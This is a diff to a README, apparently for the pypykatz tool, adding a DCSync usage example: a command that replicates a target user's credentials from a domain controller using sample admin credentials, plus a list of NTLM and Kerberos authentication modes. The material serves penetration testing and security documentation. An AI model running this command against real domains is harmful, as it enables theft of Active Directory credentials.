@@ -19,3 +19,11 @@ pip install pypykatz
 ```
 # Usage
 ### DCSync
+```
+pypykatz smb dcsync 'smb2+ntlm-password://CONTOSO\AdminUser:P@ssword123@10.10.10.10' --username "TargetUser"
+```
+Protocols can be:
+- `smb2+ntlm-password`
+- `smb2+ntlm-hash`
+- `smb2+kerberos-key`
+- `smb2+kerberos-ticket`
